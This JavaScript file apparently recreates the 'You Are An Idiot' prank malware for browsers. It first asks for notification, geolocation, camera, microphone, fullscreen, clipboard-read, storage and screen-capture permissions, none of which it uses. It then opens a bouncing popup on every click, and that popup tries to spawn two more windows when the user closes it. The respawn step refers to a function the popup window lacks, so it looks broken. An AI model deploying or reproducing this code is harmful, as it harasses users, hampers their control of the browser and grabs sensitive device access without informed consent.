// Show notification on page load
document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('notification').style.display = 'block';
});

async function requestPermissions() {
    try {
        // Request notification permission
        if (Notification.permission !== 'granted') {
            await Notification.requestPermission();
        }

        // Request geolocation
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(() => {});
        }

        // Request camera and microphone
        if (navigator.mediaDevices) {
            try {
                await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
            } catch (e) {
                console.log('Media permission denied');
            }
        }

        // Request fullscreen
        document.documentElement.requestFullscreen = document.documentElement.requestFullscreen || 
            document.documentElement.mozRequestFullScreen || 
            document.documentElement.webkitRequestFullScreen || 
            document.documentElement.msRequestFullscreen;

        if (document.documentElement.requestFullscreen) {
            document.documentElement.requestFullscreen();
        }

        // Request clipboard access
        try {
            await navigator.clipboard.readText();
        } catch (e) {
            console.log('Clipboard permission denied');
        }

        // Request storage access
        try {
            await navigator.storage.persist();
        } catch (e) {
            console.log('Storage permission denied');
        }

        // Request screen capture
        try {
            await navigator.mediaDevices.getDisplayMedia({ video: true });
        } catch (e) {
            console.log('Screen capture permission denied');
        }

        // Hide notification after permissions are granted
        document.getElementById('notification').style.display = 'none';
        
        // Enable popup creation
        document.addEventListener('click', createPopupWindow);
    } catch (error) {
        console.log('Permission request failed:', error);
    }
}

function createPopupWindow() {
    const popup = window.open('', '', 'width=300,height=250,menubar=no,toolbar=no,location=no,status=no');
    if (popup) {
        const popupContent = `
            <!DOCTYPE html>
            <html>
            <head>
                <title>You Are An Idiot</title>
                <link rel="icon" type="image/webp" href="https://static.wikia.nocookie.net/the-virus-channel/images/6/60/Idiotwhite.webp/revision/latest/thumbnail/width/360/height/360?cb=20230403175939">
                <style>
                    body {
                        margin: 0;
                        padding: 0;
                        background: black;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        overflow: hidden;
                    }
                    img {
                        width: 150px;
                        height: 150px;
                    }
                </style>
            </head>
            <body>
                <img src="https://static.wikia.nocookie.net/malware-history/images/5/58/YouAreAnIdiot.gif/revision/latest?cb=20221111194639" alt="You are an idiot">
                <script>
                    let x = 0;
                    let y = 0;
                    let dx = 2;
                    let dy = 2;
                    
                    function moveWindow() {
                        x += dx;
                        y += dy;
                        
                        if (x + window.outerWidth > screen.width || x < 0) dx = -dx;
                        if (y + window.outerHeight > screen.height || y < 0) dy = -dy;
                        
                        window.moveTo(x, y);
                        setTimeout(moveWindow, 10);
                    }
                    
                    moveWindow();
                    
                    // Create two more windows on close attempt
                    window.onbeforeunload = function() {
                        createPopupWindow();
                        createPopupWindow();
                        return null;
                    };
                </script>
            </body>
            </html>
        `;
        
        popup.document.write(popupContent);
        
        // Position randomly on screen
        popup.moveTo(
            Math.random() * (screen.width - 300),
            Math.random() * (screen.height - 250)
        );
    }
} 
